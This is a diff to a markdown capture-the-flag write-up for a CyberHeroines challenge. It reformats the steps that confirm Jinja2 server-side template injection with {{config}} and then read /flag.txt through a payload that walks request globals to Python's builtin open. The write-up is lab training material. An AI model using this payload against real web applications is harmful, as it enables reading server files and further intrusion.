@@ -22,17 +22,26 @@ Application let's us _Nominate A Cyber Heroine_. 2 things quickly came to my min
 
 ![Frances-Allen-3](/assets/ctf/cyberheroinesctf/frances-allen-3.png)
 
-[Wappalyzer](https://www.wappalyzer.com) confirms that application runs on Python, SSTI is confirmed by using ::: raw `{{config}}` ::: (Jinja2 syntax)
+[Wappalyzer](https://www.wappalyzer.com) confirms that application runs on Python, SSTI is confirmed by using 
+::: raw 
+```js
+// (Jinja2 syntax)
+{{config}}
+```
+::: 
 
 Time to visit good old HackTricks: <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti>
 
 Using RCE file read payload let's try to read flag file.
 
 ::: raw
-`{{ request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()  }}`
+```html
+{{ request.__class__._load_form_data.__globals__.__builtins__.open("/flag.txt").read()  }}
+```
 :::
 
 `Nomination received for: Test with bio:chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`
+
 ::: tip Flag
 `chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`
 :::
